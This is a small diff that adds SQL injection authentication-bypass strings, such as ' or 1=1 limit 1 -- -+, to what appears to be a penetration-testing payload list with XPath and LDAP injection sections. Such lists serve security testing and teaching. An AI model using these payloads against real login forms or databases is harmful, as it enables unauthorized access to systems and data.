@@ -11,8 +11,11 @@
 'or position()=2 or'
 admin' or '
 admin' or '1'='2
-
-
+' or "a"="a" #
+' or 1=1 limit 1 -- -+
+' or 'admin" -- -+
+ 
+ 
 ====================
 LDAP Injection
 *
